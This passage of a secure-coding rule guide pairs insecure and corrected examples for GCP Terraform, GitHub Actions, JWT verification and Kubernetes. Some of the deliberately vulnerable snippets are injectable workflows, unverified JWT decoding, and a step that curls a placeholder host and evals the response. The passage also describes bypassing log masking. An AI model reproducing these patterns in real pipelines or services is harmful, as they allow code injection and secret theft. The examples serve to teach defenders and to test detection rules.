      zone = "us-central1-a"
      internal_ip_only = false
    }
  }
}
```

**Correct: internal_ip_only set to true**

```hcl
# ok: gcp-dataproc-cluster-public-ip
resource "google_dataproc_cluster" "pass1" {
  name   = "my-pass-cluster"
  region = "us-central1"

  cluster_config {
    gce_cluster_config {
      zone = "us-central1-a"
      # no public IPs
      internal_ip_only = true
    }
  }
}
```

CWE-284: Improper Access Control

---

Vertex AI notebook instances should not have public IP addresses.

**Incorrect: no_public_ip not set or false**

```hcl
# ruleid: gcp-vertexai-private-instance
resource "google_notebooks_instance" "fail1" {
  name = "fail1-instance"
  location = "us-west1-a"
  machine_type = "e2-medium"
  vm_image {
    project      = "deeplearning-platform-release"
    image_family = "tf-latest-cpu"
  }
  no_public_ip = false
}

# ruleid: gcp-vertexai-private-instance
resource "google_notebooks_instance" "fail2" {
  name = "fail2-instance"
  location = "us-west1-a"
  machine_type = "e2-medium"
  vm_image {
    project      = "deeplearning-platform-release"
    image_family = "tf-latest-cpu"
  }
}
```

**Correct: no_public_ip set to true**

```hcl
# ok: gcp-vertexai-private-instance
resource "google_notebooks_instance" "pass1" {
  name = "pass1-instance"
  location = "us-west1-a"
  machine_type = "e2-medium"
  vm_image {
    project      = "deeplearning-platform-release"
    image_family = "tf-latest-cpu"
  }
  no_public_ip = true
}
```

CWE-284: Improper Access Control

---

RSASHA1 is a weak algorithm and should not be used for DNSSEC.

**Incorrect: RSASHA1 algorithm used**

```hcl
# ruleid: gcp-dns-key-specs-rsasha1
resource "google_dns_managed_zone" "fail" {
    name        = "example-zone"
    dns_name    = "example-de13he3.com."
    description = "Example DNS zone"
    dnssec_config {
        state = on
        default_key_specs {
            algorithm  = "rsasha1"
            key_length = 1024
            key_type   = "zoneSigning"
        }
        default_key_specs {
            algorithm = "rsasha1"
            key_length = 2048
            key_type = "keySigning"
        }
    }
}
```

**Correct: stronger algorithm used**

```hcl
# ok: gcp-dns-key-specs-rsasha1
resource "google_dns_managed_zone" "success" {
    name        = "example-zone"
    dns_name    = "example-de13he3.com."
    description = "Example DNS zone"
    dnssec_config {
        state = on
        default_key_specs {
            algorithm  = "rsasha256"
            key_length = 1024
            key_type   = "zoneSigning"
        }
        default_key_specs {
            algorithm = "rsasha256"
            key_length = 2048
            key_type = "keySigning"
        }
    }
}
```

CWE-326: Inadequate Encryption Strength

---

Load balancer SSL policies should require TLS 1.2 or higher.

**Incorrect: TLS 1.0 or 1.1 allowed**

```hcl
# ruleid: gcp-insecure-load-balancer-tls-version
resource "google_compute_ssl_policy" "badCode" {
  name = "badCode"
  min_tls_version = "TLS_1_0"
}
```

**Correct: TLS 1.2 minimum**

```hcl
# ok: gcp-insecure-load-balancer-tls-version
resource "google_compute_ssl_policy" "okCode" {
  name = "okCode"
  min_tls_version = "TLS_1_2"
}
```

CWE-326: Inadequate Encryption Strength

---

SSL policies should not allow weak cipher suites.

**Incorrect: weak ciphers allowed or min_tls_version not set**

```hcl
# ruleid: gcp-compute-ssl-policy
resource "google_compute_ssl_policy" "fail1" {
    name            = "nonprod-ssl-policy"
    profile         = "MODERN"
}

# ruleid: gcp-compute-ssl-policy
resource "google_compute_ssl_policy" "fail2" {
    name            = "custom-ssl-policy"
    min_tls_version = "TLS_1_2"
    profile         = "CUSTOM"
    custom_features = ["TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384", "TLS_RSA_WITH_AES_256_GCM_SHA384"]
}
```

**Correct: strong ciphers only with TLS 1.2**

```hcl
# ok: gcp-compute-ssl-policy
resource "google_compute_ssl_policy" "success1" {
    name            = "nonprod-ssl-policy"
    profile         = "MODERN"
    min_tls_version = "TLS_1_2"
}

# ok: gcp-compute-ssl-policy
resource "google_compute_ssl_policy" "success1" {
    name            = "custom-ssl-policy"
    min_tls_version = "TLS_1_2"
    profile         = "CUSTOM"
    custom_features = ["TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384", "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384"]
}
```

CWE-326: Inadequate Encryption Strength

---

- [Google Cloud Security Best Practices](https://cloud.google.com/security/best-practices)

- [CIS Google Cloud Platform Foundation Benchmark](https://www.cisecurity.org/benchmark/google_cloud_computing_platform)

- [Terraform Google Provider Documentation](https://registry.terraform.io/providers/hashicorp/google/latest/docs)

- [OWASP Top 10](https://owasp.org/Top10/)

### 0.25 Secure GitHub Actions

**Impact: HIGH (Prevents code injection, secrets theft, and supply chain attacks in CI/CD pipelines)**

GitHub Actions workflows can be vulnerable to several security issues including script injection, secrets exposure, and supply chain attacks. Attackers who exploit these vulnerabilities can steal repository secrets, inject malicious code, or compromise the entire CI/CD pipeline.

1. **Script Injection**: Using untrusted input (like PR titles or issue bodies) directly in `run:` commands allows attackers to inject arbitrary code

2. **Privileged Triggers**: `pull_request_target` and `workflow_run` events run with elevated privileges, making checkout of untrusted code dangerous

3. **Secrets Exposure**: Improper handling of secrets can leak them in logs or to malicious code

4. **Supply Chain**: Third-party actions not pinned to commit SHAs can be compromised

---

Using variable interpolation `${{...}}` with `github` context data in a `run:` step could allow an attacker to inject their own code into the runner. This would allow them to steal secrets and code. `github` context data can have arbitrary user input and should be treated as untrusted.

---

Using variable interpolation `${{...}}` with `github` context data in `actions/github-script`'s `script:` step could allow an attacker to inject their own code into the runner.

---

When using `pull_request_target`, the Action runs in the context of the target repository with access to all repository secrets. Checking out the incoming PR code while having access to secrets is dangerous because you may inadvertently execute arbitrary code from the incoming PR.

---

Similar to `pull_request_target`, when using `workflow_run`, the Action runs in the context of the target repository with access to all repository secrets. Checking out incoming PR code with this trigger is dangerous.

---

Data is being eval'd from a `curl` command. An attacker with control of the server in the `curl` command could inject malicious code into the `eval`, resulting in a system compromise.

---

The environment variable `ACTIONS_ALLOW_UNSECURE_COMMANDS` grants permissions to use the deprecated `set-env` and `add-path` commands, which have a vulnerability that could allow environment variable modification by attackers.

---

An action sourced from a third-party repository on GitHub is not pinned to a full length commit SHA. Pinning an action to a full length commit SHA is currently the only way to use an action as an immutable release. This helps mitigate the risk of a bad actor adding a backdoor to the action's repository.

---

GitHub Actions provides the `add-mask` workflow command to mask sensitive data in workflow logs. However, if workflow commands have been stopped (via `echo "::stop-commands::$stopMarker"`), sensitive data can be leaked. An attacker could copy the workflow to another branch and add a payload to stop workflow command processing, exposing secrets.

---

**Incorrect: vulnerable to script injection via PR title**

```yaml
jobs:
  docker-build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2

      - name: Check PR title
        # ruleid: run-shell-injection
        run: |
          title="${{ github.event.pull_request.title }}"
          if [[ $title =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```

**Incorrect: vulnerable to injection via workflow inputs**

```yaml
on:
  workflow_dispatch:
    inputs:
      message_to_print:
        type: string
        required: false

jobs:
  docker-build:
    runs-on: ubuntu-latest
    steps:
      - name: Print a message
        # ruleid: run-shell-injection
        run: |
          echo "${{github.event.inputs.message_to_print}}"
```

**Incorrect: vulnerable to injection via issue title**

```yaml
jobs:
  docker-build:
    runs-on: ubuntu-latest
    steps:
      - name: Show issue title
        # ruleid: run-shell-injection
        run: |
          echo "${{ github.event.issue.title }}"
```

**Incorrect: vulnerable to injection via commit author email**

```yaml
jobs:
  docker-build:
    runs-on: ubuntu-latest
    steps:
      - name: Show author email
        # ruleid: run-shell-injection
        run: |
          echo "${{ github.event.commits.fix-bug.author.email }}"
```

**Correct: safe use of GitHub context**

```yaml
jobs:
  docker-build:
    runs-on: ubuntu-latest
    steps:
      - name: Push commit hash if PR
        if: github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository
        # ok: run-shell-injection
        run: |
          tag=returntocorp/semgrep:${{ github.sha }}
          docker build -t "$tag" .
          docker push "$tag"
```

**Correct: using secrets safely**

```yaml
jobs:
  docker-build:
    runs-on: ubuntu-latest
    steps:
      - name: benign
        # ok: run-shell-injection
        run: |
          AUTH_HEADER="Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}";
          HEADER="Accept: application/vnd.github.v3+json";
```

**Correct: using workflow_run artifacts_url safely**

```yaml
jobs:
  docker-build:
    runs-on: ubuntu-latest
    steps:
      - name: Download and Extract Artifacts
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        # ok: run-shell-injection
        run: |
          mkdir -p artifacts && cd artifacts
          artifacts_url=${{ github.event.workflow_run.artifacts_url }}
          gh api "$artifacts_url" -q '.artifacts[] | [.name, .archive_download_url] | @tsv' | while read artifact
          do
            IFS=$'\t' read name url <<< "$artifact"
            gh api $url > "$name.zip"
            unzip -d "$name" "$name.zip"
          done
```

**Fix**: Use an intermediate environment variable with `env:` to store the data and use the environment variable in the `run:` script. Be sure to use double-quotes around the environment variable, like this: `"$ENVVAR"`.

**Incorrect: vulnerable to injection via PR title in github-script**

```yaml
jobs:
  script-run:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v3

      - name: Run script 1
        uses: actions/github-script@v6
        if: steps.report-diff.outputs.passed == 'true'
        with:
          # ruleid: github-script-injection
          script: |
            const fs = require('fs');
            const body = fs.readFileSync('/tmp/file.txt', {encoding: 'utf8'});

            await github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: '${{ github.event.pull_request.title }}' + body
            })

            return true;
```

**Incorrect: vulnerable to injection via issue title in github-script**

```yaml
jobs:
  script-run:
    runs-on: ubuntu-latest
    steps:
      - name: Run script 2
        uses: actions/github-script@latest
        with:
          # ruleid: github-script-injection
          script: |
            const fs = require('fs');
            const body = fs.readFileSync('/tmp/${{ github.event.issue.title }}.txt', {encoding: 'utf8'});

            await github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: 'Thanks for reporting!'
            })

            return true;
```

**Correct: non-github-script action is safe**

```yaml
jobs:
  script-run:
    runs-on: ubuntu-latest
    steps:
      - name: Ok script 1
        uses: not-github/custom-action@latest
        with:
          # ok: github-script-injection
          script: |
            return ${{ github.event.issue.title }};
```

**Correct: using safe github context like artifacts_url**

```yaml
jobs:
  script-run:
    runs-on: ubuntu-latest
    steps:
      - name: Ok script 2
        uses: actions/github-script@latest
        with:
          # ok: github-script-injection
          script: |
            console.log('${{ github.event.workflow_run.artifacts_url }}');

            await github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: 'Thanks for reporting!'
            })

            return true;
```

**Incorrect: checking out PR code with pull_request_target**

```yaml
# cf. https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
# INSECURE. Provided as an example only.
on:
  pull_request_target:
  pull_request:

jobs:
  build:
    name: Build and test
    runs-on: ubuntu-latest
    steps:
      # ruleid: pull-request-target-code-checkout
      - uses: actions/checkout@v2
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - uses: actions/setup-node@v1
      - run: |
          npm install
          npm build

      - uses: completely/fakeaction@v2
        with:
          arg1: ${{ secrets.supersecret }}
```

**Incorrect: using merge ref with pull_request_target**

```yaml
on:
  pull_request_target:
  pull_request:

jobs:
  # cf. https://github.com/justinsteven/advisories/blob/master/2021_github_actions_checkspelling_token_leak_via_advice_symlink.md
  spelling:
    name: Spell checking
    runs-on: ubuntu-latest
    steps:
      # ruleid: pull-request-target-code-checkout
      - name: checkout-merge
        if: contains(github.event_name, 'pull_request')
        uses: actions/checkout@v2
        with:
          ref: refs/pull/${{github.event.pull_request.number}}/merge
```

**Correct: no checkout of PR code**

```yaml
on:
  pull_request_target:
  pull_request:

jobs:
  this-is-safe-because-no-checkout:
    name: Echo
    runs-on: ubuntu-latest
    steps:
      # ok: pull-request-target-code-checkout
      - name: echo
        run: |
          echo "Hello, world"
```

**Incorrect: checking out PR code with workflow_run**

```yaml
on:
  workflow_run:
    workflows: ["smth-else"]
    types:
    - completed
  pull_request:

jobs:
  build:
    name: Build and test
    runs-on: ubuntu-latest
    steps:
      # ruleid: workflow-run-target-code-checkout
      - uses: actions/checkout@v2
        with:
          ref: ${{ github.event.workflow_run.head.sha }}

      - uses: actions/setup-node@v1
      - run: |
          npm install
          npm build

      - uses: completely/fakeaction@v2
        with:
          arg1: ${{ secrets.supersecret }}
```

**Incorrect: using merge ref with workflow_run**

```yaml
on:
  workflow_run:
    workflows: ["smth-else"]
    types:
    - completed
  pull_request:

jobs:
  spelling:
    name: Spell checking
    runs-on: ubuntu-latest
    steps:
      # ruleid: workflow-run-target-code-checkout
      - name: checkout-merge
        if: contains(github.event_name, 'pull_request')
        uses: actions/checkout@v2
        with:
          ref: refs/pull/${{github.event.workflow_run.number}}/merge
```

**Correct: no checkout of PR code**

```yaml
on:
  workflow_run:
    workflows: ["smth-else"]
    types:
    - completed
  pull_request:

jobs:
  this-is-safe-because-no-checkout:
    name: Echo
    runs-on: ubuntu-latest
    steps:
      # ok: workflow-run-target-code-checkout
      - name: echo
        run: |
          echo "Hello, world"
```

**Incorrect: eval'ing data from curl**

```yaml
name: Build and deploy Semgrep scanner lambda

on:
  workflow_dispatch:
  push:
    branches: develop

jobs:
  docker-build:
    runs-on: ubuntu-latest
    env:
      workdir: lambdas/run-semgrep
    steps:
      - uses: actions/checkout@v2
      - name:
          blah
          # ruleid: curl-eval
        run: |
          CONTENTS=$(curl https://blah.com)
          eval $CONTENTS
```

**Correct: safe docker build without eval**

```yaml
name: Build and deploy Semgrep scanner lambda

on:
  workflow_dispatch:
  push:
    branches: develop

jobs:
  docker-build:
    runs-on: ubuntu-latest
    env:
      workdir: lambdas/run-semgrep
    steps:
      - uses: actions/checkout@v2
      - name: Build Docker image
        working-directory:
          ${{ env.workdir }}/src
          # ok: curl-eval
        run: docker build -t semgrep-scanner:latest .
```

**Fix**: Avoid eval'ing untrusted data if you can. If you must do this, consider checking the SHA sum of the content returned by the server to verify its integrity.

**Incorrect: enabling unsecure commands in step env**

```yaml
on: pull_request

name: command-processing-test
jobs:
  dangerous-job:
    name: example
    runs-on: ubuntu-latest
    steps:
      - name: dont-do-this
        env:
          # ruleid: allowed-unsecure-commands
          ACTIONS_ALLOW_UNSECURE_COMMANDS: true
        run: |
          echo "don't do this"
```

**Incorrect: enabling unsecure commands in job env**

```yaml
on: pull_request

name: command-processing-test
jobs:
  another-dangerous-job:
    name: example2
    runs-on: ubuntu-latest
    env:
      # ruleid: allowed-unsecure-commands
      ACTIONS_ALLOW_UNSECURE_COMMANDS: true
    steps:
      - name: or-this
        run: |
          echo "seriously, dont"
```

**Correct: no unsecure commands**

```yaml
on: pull_request

name: command-processing-test
jobs:
  this-is-ok:
    name: example3
    runs-on: ubuntu-latest
    env: PREFIX = "~~^_^~~"
    run: |
      echo "$PREFIX hello"
```

**Fix**: Don't use `ACTIONS_ALLOW_UNSECURE_COMMANDS`. Instead, use Environment Files.

**Incorrect: using tag or branch reference**

```yaml
on:
  pull_request_target:
  pull_request:

jobs:
  build:
    name: Build and test
    runs-on: ubuntu-latest
    steps:
      # ruleid: third-party-action-not-pinned-to-commit-sha
      - uses: fakerepo/comment-on-pr@v1
        with:
          message: |
            Thank you!

      # ruleid: third-party-action-not-pinned-to-commit-sha
      - uses: fakerepo/comment-on-pr
        with:
          message: |
            Thank you!
```

**Incorrect: using short SHA**

```yaml
jobs:
  build:
    name: Build and test
    runs-on: ubuntu-latest
    steps:
      # ruleid: third-party-action-not-pinned-to-commit-sha
      - uses: completely/fakeaction@5fd3084
        with:
          arg2: ${{ secrets.supersecret2 }}
```

**Incorrect: unpinned Docker action**

```yaml
jobs:
  build:
    name: Build and test
    runs-on: ubuntu-latest
    steps:
      # ruleid: third-party-action-not-pinned-to-commit-sha
      - uses: docker://gcr.io/cloud-builders/gradle

      # ruleid: third-party-action-not-pinned-to-commit-sha
      - uses: docker://alpine:3.8
```

**Correct: pinned to full commit SHA**

```yaml
jobs:
  build:
    name: Build and test
    runs-on: ubuntu-latest
    steps:
      # ok: third-party-action-not-pinned-to-commit-sha
      - uses: completely/fakeaction@5fd3084fc36e372ff1fff382a39b10d03659f355
        with:
          arg2: ${{ secrets.supersecret2 }}
```

**Correct: Docker action with pinned digest**

```yaml
jobs:
  build:
    name: Build and test
    runs-on: ubuntu-latest
    steps:
      # ok: third-party-action-not-pinned-to-commit-sha
      - uses: docker://alpine@sha256:402d21757a03a114d273bbe372fa4b9eca567e8b6c332fa7ebf982b902207242
```

**Correct: GitHub-owned actions don't need pinning**

```yaml
jobs:
  build:
    name: Build and test
    runs-on: ubuntu-latest
    steps:
      # ok: third-party-action-not-pinned-to-commit-sha
      - uses: actions/checkout@v2
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      # ok: third-party-action-not-pinned-to-commit-sha
      - uses: actions/setup-node@master

      # ok: third-party-action-not-pinned-to-commit-sha
      - name: Upload SARIF file for GitHub Advanced Security Dashboard
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: semgrep.sarif
        if: always()
```

**Correct: local actions don't need pinning**

```yaml
jobs:
  build:
    name: Build and test
    runs-on: ubuntu-latest
    steps:
      # ok: third-party-action-not-pinned-to-commit-sha
      - uses: ./.github/actions/do-a-local-action
        with:
          arg1: ${{ secrets.supersecret1 }}

  build2:
    name: Build and test using a local workflow
    # ok: third-party-action-not-pinned-to-commit-sha
    uses: ./.github/workflows/use_a_local_workflow.yml@master
    secrets: inherit
    with:
      examplearg: true
```

**Incorrect: using add-mask which can be bypassed**

```yaml
name: Test Workflow

on:
  push:
    branches:
      - main

jobs:
  test-job:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Setup Python
        uses: actions/setup-python@v2
        with:
          python-version: '3.8'

      - name: Run script to generate token
        run: |
          TOKEN=$(openssl rand -hex 16)
          # ruleid: unsafe-add-mask-workflow-command
          echo "::add-mask::$TOKEN"
          echo "TOKEN=$TOKEN" >> $GITHUB_ENV

      - name: Use the token
        run: |
          echo "Using the token in the next step"
          curl -H "Authorization: Bearer $TOKEN" https://api.example.com

      - name: Print GitHub context
        run: |
          echo "GitHub context:"
          echo "${{ toJSON(github) }}"
          # ruleid: unsafe-add-mask-workflow-command
          echo "::add-mask::${{ secrets.GITHUB_TOKEN }}"
```

**Fix**: Prefer using GitHub's native secrets handling rather than relying on `add-mask` for security-critical masking. Consider the risk that an attacker with write access could modify the workflow to bypass masking.

**References:**

- CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

- CWE-94: Improper Control of Generation of Code ('Code Injection')

- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

- CWE-749: Exposed Dangerous Method or Function

- CWE-913: Improper Control of Dynamically-Managed Code Resources

- CWE-1357: Reliance on Insufficiently Trustworthy Component

- CWE-353: Missing Support for Integrity Check

- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/learn-github-actions/security-hardening-for-github-actions)

- [GitHub Security Lab - Preventing Pwn Requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)

- [GitHub Security Lab - Untrusted Input](https://securitylab.github.com/research/github-actions-untrusted-input/)

- [OWASP Top 10 A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)

Reference: [https://docs.github.com/en/actions/learn-github-actions/security-hardening-for-github-actions#understanding-the-risk-of-script-injections](https://docs.github.com/en/actions/learn-github-actions/security-hardening-for-github-actions#understanding-the-risk-of-script-injections), [https://securitylab.github.com/research/github-actions-untrusted-input/](https://securitylab.github.com/research/github-actions-untrusted-input/), [https://securitylab.github.com/research/github-actions-preventing-pwn-requests/](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/), [https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability), [https://docs.github.com/en/actions/learn-github-actions/security-hardening-for-github-actions#understanding-the-risk-of-script-injections](https://docs.github.com/en/actions/learn-github-actions/security-hardening-for-github-actions#understanding-the-risk-of-script-injections), [https://github.com/actions/toolkit/blob/main/docs/commands.md#environment-files](https://github.com/actions/toolkit/blob/main/docs/commands.md#environment-files), [https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions), [https://github.com/github/docs/blob/main/content/actions/using-workflows/workflow-commands-for-github-actions.md#masking-a-value-in-a-log](https://github.com/github/docs/blob/main/content/actions/using-workflows/workflow-commands-for-github-actions.md#masking-a-value-in-a-log)

### 0.26 Secure JWT Authentication

**Impact: HIGH**

JSON Web Tokens (JWT) are widely used for authentication and authorization. However, improper implementation can lead to serious security vulnerabilities including authentication bypass and token forgery. The most critical JWT vulnerability is decoding tokens without verifying their signatures, which allows attackers to forge tokens with arbitrary claims, impersonate any user, or escalate privileges. Other vulnerabilities include accepting the "none" algorithm, using weak secrets, and accepting unsigned tokens. Related CWEs: CWE-287 (Improper Authentication), CWE-345 (Insufficient Verification of Data Authenticity), CWE-347 (Improper Verification of Cryptographic Signature).

- https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures

- https://owasp.org/Top10/A01_2021-Broken_Access_Control/

- https://owasp.org/Top10/A02_2021-Cryptographic_Failures/

- https://semgrep.dev/blog/2020/hardcoded-secrets-unverified-tokens-and-other-common-jwt-mistakes/

- https://cwe.mitre.org/data/definitions/287

- https://cwe.mitre.org/data/definitions/345

- https://cwe.mitre.org/data/definitions/347

- https://www.npmjs.com/package/jwt-simple

- https://github.com/we45/Vulnerable-Flask-App/blob/752ee16087c0bfb79073f68802d907569a1f0df7/app/app.py#L96

**Incorrect: JavaScript jsonwebtoken - decode without verify**

```javascript
const jwt = require('jsonwebtoken');

function notOk(token) {
  // ruleid: jwt-decode-without-verify
  if (jwt.decode(token, true).param === true) {
    console.log('token is valid');
  }
}
```

**Correct: JavaScript jsonwebtoken - verify before decode**

```javascript
const jwt = require('jsonwebtoken');

function ok(token, key) {
  // ok: jwt-decode-without-verify
  jwt.verify(token, key);
  if (jwt.decode(token, true).param === true) {
    console.log('token is valid');
  }
}
```

**Incorrect: JavaScript jwt-simple - verification disabled**

```javascript
const jwt = require('jwt-simple');
const secretKey = process.env.JWT_SECRET;

// Route that requires authentication
app.get('/protectedRoute1', (req, res) => {
  const token = req.headers.authorization;

  if (!token) {
    return res.status(401).json({ error: 'Unauthorized. Token missing.' });
  }

  try {
    // ruleid: jwt-simple-noverify
    const decoded = jwt.decode(token, secretKey, 'HS256');
    res.json({ message: `Hello ${decoded.username}` });
  } catch (error) {
    res.status(401).json({ error: 'Unauthorized. Invalid token.' });
  }
});

// Also incorrect - passing true disables verification
app.get('/protectedRoute2', (req, res) => {
  const token = req.headers.authorization;

  try {
    // ruleid: jwt-simple-noverify
    const decoded = jwt.decode(token, secretKey, true);
    res.json({ message: `Hello ${decoded.username}` });
  } catch (error) {
    res.status(401).json({ error: 'Unauthorized. Invalid token.' });
  }
});

// Also incorrect - string 'false' is truthy
app.get('/protectedRoute3', (req, res) => {
  const token = req.headers.authorization;

  try {
    // ruleid: jwt-simple-noverify
    const decoded = jwt.decode(token, secretKey, 'false');
    res.json({ message: `Hello ${decoded.username}` });
  } catch (error) {
    res.status(401).json({ error: 'Unauthorized. Invalid token.' });
  }
});
```

**Correct: JavaScript jwt-simple - verification enabled**

```javascript
const jwt = require('jwt-simple');
const secretKey = process.env.JWT_SECRET;

// Route that requires authentication - default verification
app.get('/protectedRoute4', (req, res) => {
  const token = req.headers.authorization;

  if (!token) {
    return res.status(401).json({ error: 'Unauthorized. Token missing.' });
  }

  try {
    // ok: jwt-simple-noverify
    const decoded = jwt.decode(token, secretKey);
    res.json({ message: `Hello ${decoded.username}` });
  } catch (error) {
    res.status(401).json({ error: 'Unauthorized. Invalid token.' });
  }
});

// Explicitly enable verification with false
app.get('/protectedRoute5', (req, res) => {
  const token = req.headers.authorization;

  try {
    // ok: jwt-simple-noverify
    const decoded = jwt.decode(token, secretKey, false);
    res.json({ message: `Hello ${decoded.username}` });
  } catch (error) {
    res.status(401).json({ error: 'Unauthorized. Invalid token.' });
  }
});
```

**Incorrect: Python PyJWT - verify_signature disabled**

```python
import jwt
from jwt.exceptions import DecodeError, MissingRequiredClaimError, InvalidKeyError

def tests(token):
    # ruleid:unverified-jwt-decode
    jwt.decode(encoded, key, options={"verify_signature": False})

    # ruleid:unverified-jwt-decode
    opts = {"verify_signature": False}
    jwt.decode(encoded, key, options=opts)

    a_false_boolean = False
    # ruleid:unverified-jwt-decode
    opts2 = {"verify_signature": a_false_boolean}
    jwt.decode(encoded, key, options=opts2)
```

**Correct: Python PyJWT - verify_signature enabled**

```python
import jwt
from jwt.exceptions import DecodeError, MissingRequiredClaimError, InvalidKeyError

def tests(token):
    # ok:unverified-jwt-decode
    jwt.decode(encoded, key, options={"verify_signature": True})

    opts = {"verify_signature": True}
    # ok:unverified-jwt-decode
    jwt.decode(encoded, key, options=opts)

    a_false_boolean = True
    opts2 = {"verify_signature": a_false_boolean}
    # ok:unverified-jwt-decode
    jwt.decode(encoded, key, options=opts2)

    # ok:unverified-jwt-decode - default is to verify
    jwt.decode(encoded, key)
```

**Incorrect: Java auth0 java-jwt - decode without verify**

```java
package jwt_test.jwt_test_1;

import com.auth0.jwt.JWT;
import com.auth0.jwt.algorithms.Algorithm;
import com.auth0.jwt.exceptions.JWTCreationException;
import com.auth0.jwt.interfaces.DecodedJWT;
import com.auth0.jwt.interfaces.JWTVerifier;

abstract class App2
{

    private void bad( String[] args )
    {
        System.out.println( "Hello World!" );

        try {
            Algorithm algorithm = Algorithm.none();

            String token = JWT.create()
                .withIssuer("auth0")
                .sign(algorithm);
            // ruleid: java-jwt-decode-without-verify
            DecodedJWT jwt = JWT.decode(token);

        } catch (JWTCreationException exception){
            //Invalid Signing configuration / Couldn't convert Claims.
        }

    }
}
```

**Correct: Java auth0 java-jwt - verify before use**

```java
package jwt_test.jwt_test_1;

import com.auth0.jwt.JWT;
import com.auth0.jwt.algorithms.Algorithm;
import com.auth0.jwt.exceptions.JWTCreationException;
import com.auth0.jwt.interfaces.DecodedJWT;
import com.auth0.jwt.interfaces.JWTVerifier;

public class App
{

    private void verifyToken(String token, String secret) {
        Algorithm algorithm = Algorithm.HMAC256(secret);
        JWTVerifier verifier = JWT.require(algorithm)
                .withIssuer("auth0")
                .build(); //Reusable verifier instance
        DecodedJWT jwt2 = verifier.verify(token);
    }

    public void ok( String[] args )
    {
        System.out.println( "Hello World!" );

        try {
            Algorithm algorithm = Algorithm.HMAC256(args[0]);

            String token = JWT.create()
                .withIssuer("auth0")
                .sign(algorithm);

            // Decode only after verification in verifyToken()
            DecodedJWT jwt = JWT.decode(token);

        } catch (JWTCreationException exception){
            //Invalid Signing configuration / Couldn't convert Claims.
        }

    }
}
```

**Incorrect: Go jwt-go - ParseUnverified**

```go
package main

import (
    "fmt"

    "github.com/dgrijalva/jwt-go"
)

func bad1(tokenString string) {
    // ruleid: jwt-go-parse-unverified
    token, _, err := new(jwt.Parser).ParseUnverified(tokenString, jwt.MapClaims{})
    if err != nil {
        fmt.Println(err)
        return
    }

    if claims, ok := token.Claims.(jwt.MapClaims); ok {
        fmt.Println(claims["foo"], claims["exp"])
    } else {
        fmt.Println(err)
    }
}
```

**Correct: Go jwt-go - ParseWithClaims**

```go
package main

import (
    "fmt"

    "github.com/dgrijalva/jwt-go"
)

func ok1(tokenString string, keyFunc Keyfunc) {
    // ok: jwt-go-parse-unverified
    token, err := new(jwt.Parser).ParseWithClaims(tokenString, jwt.MapClaims{}, keyFunc)
    if err != nil {
        fmt.Println(err)
        return
    }

    if claims, ok := token.Claims.(jwt.MapClaims); ok {
        fmt.Println(claims["foo"], claims["exp"])
    } else {
        fmt.Println(err)
    }
}
```

**Incorrect: Ruby ruby-jwt - verification disabled**

```ruby
require 'jwt'

def bad1(hmac_secret)
    # ruleid: ruby-jwt-decode-without-verify
    decoded_token = JWT.decode token, hmac_secret, false, { algorithm: 'HS256' }
    puts decoded_token
end
```

**Correct: Ruby ruby-jwt - verification enabled**

```ruby
require 'jwt'

def ok1(hmac_secret)
    # ok: ruby-jwt-decode-without-verify
    token = JWT.encode payload, hmac_secret, 'HS256'
    puts token
    decoded_token = JWT.decode token, hmac_secret, true, { algorithm: 'HS256' }
    puts decoded_token
end
```

**Incorrect: C# TokenValidationParameters - unsigned tokens accepted**

```csharp
services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme).AddJwtBearer(options =>
            {

                options.TokenValidationParameters = new TokenValidationParameters
                {
                    // ruleid: unsigned-security-token
                    RequireSignedTokens = false,
                    ValidateIssuer = false,
                    ValidateAudience = false
                };
            });
```

**Correct: C# TokenValidationParameters - signed tokens required**

```csharp
services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme).AddJwtBearer(options =>
            {
                options.TokenValidationParameters = new TokenValidationParameters
                {
                    // ok: unsigned-security-token
                    RequireSignedTokens = true,
                    ValidateIssuer = false,
                    ValidateAudience = false
                };
            });
```

### 0.27 Secure Kubernetes Configurations

**Impact: HIGH**

This guide provides security best practices for Kubernetes YAML configurations. Following these patterns helps prevent common security misconfigurations that could expose your containers and cluster to attacks.

Key Security Principles:

1. Least Privilege: Containers should run with minimal permissions and as non-root users

2. Isolation: Limit host namespace sharing (PID, network, IPC) to prevent container escapes

3. Immutability: Use read-only filesystems to prevent runtime modifications

4. Secure Communications: Always verify TLS certificates for encrypted connections

5. Secrets Management: Never store secrets directly in configuration files

6. RBAC: Apply principle of least privilege to cluster roles and permissions

**Incorrect: Pod - security context missing allowPrivilegeEscalation**

```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
    # ruleid: allow-privilege-escalation-no-securitycontext
    - name: nginx
      image: nginx
```

